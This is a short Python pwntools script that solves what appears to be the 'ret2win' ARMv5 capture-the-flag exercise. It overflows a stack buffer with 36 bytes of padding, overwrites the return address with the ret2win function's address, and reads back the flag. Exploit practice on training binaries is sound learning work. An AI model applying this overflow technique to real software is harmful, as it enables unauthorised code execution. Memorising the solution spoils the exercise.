from pwn import *

BINARY = "./ret2win_armv5"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)

rop = b"A" * 36
rop += p32(ELF.symbols["ret2win"])

log.success(f"ROP chain : {rop}")
p.sendline(rop)

flag = p.recvall(timeout=0.1).split(b'\n')[-9]
log.success(f"FLAG : {flag}")
